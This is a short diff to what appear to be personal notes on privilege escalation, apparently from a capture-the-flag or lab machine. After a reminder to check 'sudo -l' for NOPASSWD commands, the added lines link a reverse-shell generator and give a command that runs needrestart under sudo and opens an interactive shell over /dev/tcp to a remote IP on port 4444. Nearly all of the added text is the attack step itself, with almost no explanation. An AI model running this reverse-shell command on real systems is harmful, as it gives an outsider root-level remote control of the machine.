@@ -31,3 +31,7 @@ sudo: you are not permitted to use the -R option with woot
 sudo -l
 
 Are there commands that can be run with NOPASSWD?
+
+https://www.revshells.com/
+
+sudo /usr/sbin/needrestart sh -i >& /dev/tcp/10.10.14.120/4444 0>&1
